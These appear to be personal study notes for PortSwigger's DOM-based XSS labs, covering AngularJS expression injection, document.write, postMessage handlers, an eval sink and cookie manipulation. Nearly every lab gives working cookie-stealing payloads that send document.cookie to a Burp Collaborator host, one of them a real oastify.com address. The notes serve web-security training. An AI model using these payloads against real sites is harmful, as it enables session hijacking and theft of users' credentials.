## Approach

1. Check for **ng-app attributes**, if yes go [here](#[1.%20DOM%20XSS%20in%20AngularJS%20expression%20with%20angle%20brackets%20and%20double%20quotes%20HTML-encoded](https%20//portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression))

```html
<body ng-app="" class="ng-scope">
```

> ***Burp Scanner*** is only able to pick the vuln library

![](attachments/Pasted%20image%2020260102124417.png)

2. For DOM stuffs always search for `<script` on the source code and read it if there's any [source](https://github.com/wisec/domxsswiki/wiki/sources) for XSS

> Having trouble with finding [sinks](https://github.com/wisec/domxsswiki/wiki/Sinks)? Use ***DOM Invader***
> Just make sure you have provided the parameter for ***DOM Invader*** to inject

3. If you see `<script>window.addEventListener('message'...`, this js listens to web messages, look [here](#[3.%20DOM%20XSS%20using%20web%20messages%20and%20`JSON.parse`](https%20//portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-json-parse))

> ***DOM Invader*** can help with web message DOM XSS

4. If there's **timing failure** like race condition where the HTML loads slower than the JS refer to [this](#^c1d800)

## Labs
### [1. DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression) 

> [!NOTE] 
> Website uses AngularJS which has it's own XSS vuln, use the search function, your input will be outputted under the `<body>` html tag, allowing DOM XSS under AngularJS

**Trigger *alert()***

```js
{{constructor.constructor('alert(1)')()}}
```

**Steal cookie payload**

```js
{{constructor.constructor('fetch("//[BURP_COLLABORATOR]?c="+btoa(document.cookie))')()}}
```

### [2. DOM XSS in `document.write` sink using source `location.search` inside a select element](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element)

> [!NOTE] 
> Use check stock feature, check the source code reveals a script code that adds a `<select>` option based on **storeId** param, product?productId=1&storeId=asdf, inject XSS there

***alert()* payload**

```html
?productId=1&storeId=<script>alert()</script>
```

**Steal cookie payload**
> ('+' -> %2b, URL encoded), so that it's not interpreted as whitespace

```html
?productId=1&storeId=<script>fetch('//[BURP_COLLABORATOR]?c='%2bbtoa(document.cookie))</script>
```

### [3. DOM XSS using web messages and `JSON.parse`](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-json-parse)

> [!NOTE] 
> Check source code for `<script`, it has JS that listens for web messages `<script>window.addEventListener('message'...`, JS creates `<iframe>` with `src` based on `d.url` that can be assigned web `type = "load-channel"`, supply XSS in URL context to exploit this

> ***DOM Invader*** works here, enable **Postmessage interception is on**

![](attachments/Pasted%20image%2020260102124440.png)

**Direct testing on devtools console**

```js
window.postMessage('{"type":"load-channel","url":"javascript:print()"}','*')
```

> ***DOM Invader*** can help create POC to use by **Build POC** button

***print()* XSS payload**

```js
<iframe src="https://[LAB_URL]/" onload=this.contentWindow.postMessage('{"type":"load-channel","url":"javascript:print()"}','*')>
```

**Steal cookie payload**

> the single quotes inside fetch() needed to be escaped(\) to not interfere with the existing single quotes from postMessage()
```js
<iframe src="https://[LAB_URL]/" onload=this.contentWindow.postMessage('{"type":"load-channel","url":"javascript:fetch(\'//wtte1hjz9i0lkt6ehg2njtjl5cb4z6nv.oastify.com?c=\'+btoa(document.cookie))"}','*')>
```

### [4. DOM XSS using web messages and a JavaScript URL](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-a-javascript-url)

> [!NOTE] 
> There is `<script>window.addEventListener('message'...` in home page, if the web message contains `http:`, the user will be redirected **(Open redirection)** so we can do an XSS from that

**Direct testing on devtools console**

```js
window.postMessage('javascript:print()//http:','*')
```

***print()* XSS payload**

```js
<iframe src="https://[LAB_URL]/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
```

**Steal cookie payload**

```js
<iframe src="https://[LAB_URL]/" onload="this.contentWindow.postMessage('javascript:fetch(\'//[BURP_COLLABORATOR]?c=\'+btoa(document.cookie))//http:','*')">
```

### [5. DOM XSS using web messages](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages)

> [!NOTE] 
> There's `window.addEventListener('message'...` in the home page, it appends web message to a `<div>` by `innerHTML`, craft XSS payload with `<img>` and deliver the exploit by `<iframe>` 

**Direct testing devtools console**

```js
window.postMessage('<img src onerror=alert()>','*')
```

***print()* XSS payload**

```js
<iframe src="https://[LAB_URL]/" onload="this.contentWindow.postMessage('<img src onerror=\'print()\'>','*')">
```

**Steal cookie payloads**

```js
<iframe src="https://[LAB_URL]/" 
onload="this.contentWindow.postMessage('<img src onerror=\'fetch(`//[BURP_COLLABORATOR]?c=${btoa(document.cookie)}`)\'>','*')">
```

```js
<iframe src="https://[LAB_URL]/" 
onload="this.contentWindow.postMessage('<img src onerror=\'window.location=`//[BURP_COLLABORATOR]?c=${btoa(document.cookie)}`\'>','*')">
```

```js
<iframe src="https://[LAB_URL]/" 
onload="this.contentWindow.postMessage('<img src onerror=\'document.location=`//[BURP_COLLABORATOR]?c=${btoa(document.cookie)}`\'>','*')">
```

> For timing failure, like race condition use `setTimeout()`
```js
<iframe src="https://[LAB_URL]/" 
onload="setTimeout(()=>this.contentWindow.postMessage('<img src onerror=\'document.location=`//[BURP_COLLABORATOR]?c=${btoa(document.cookie)}`\'>','*'), 500)">
```

### [6. Reflected DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected)

> [!NOTE] 
> A js file contains a sink `eval` that accepts input from `source` `window.location.search`, input XSS payload to `search` param, finding `source` and `sink` can also be done with ***DOM Invader*** 

***alert()* payload**

```html
?search=\"-alert()}//
```

**Cookie stealer**

```html
?search=\"-fetch(`//[BURP_COLLABORATOR]?c=${btoa(document.cookie)}`)}//
```

### [7. DOM-based cookie manipulation](https://portswigger.net/web-security/dom-based/cookie-manipulation/lab-dom-cookie-manipulation)

> [!NOTE] 
> There's a cookie `lastViewedProduct`, because it's set based on the URL when visiting a product page and it's reflected as part of an `<a href=` attribute we can XSS this

***print()* payload**

```html
<iframe src="https://[LAB_URL]/product?productId=1&x='><img src onerror='print()'>">
```

**Cookie stealing**

```html
<iframe src="https://[LAB_URL]/product?productId=1&x='><img src onerror='fetch(`//[BURP_COLLABORATOR]?c=${btoa(document.cookie)}`)'>">
```
## Cheat Sheet

[Sources · wisec/domxsswiki Wiki · GitHub](https://github.com/wisec/domxsswiki/wiki/sources)
> DOMXSSWIKI

[Cross-Site Scripting (XSS) Cheat Sheet - 2025 Edition | Web Security Academy](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
> Portswigger cheatsheet
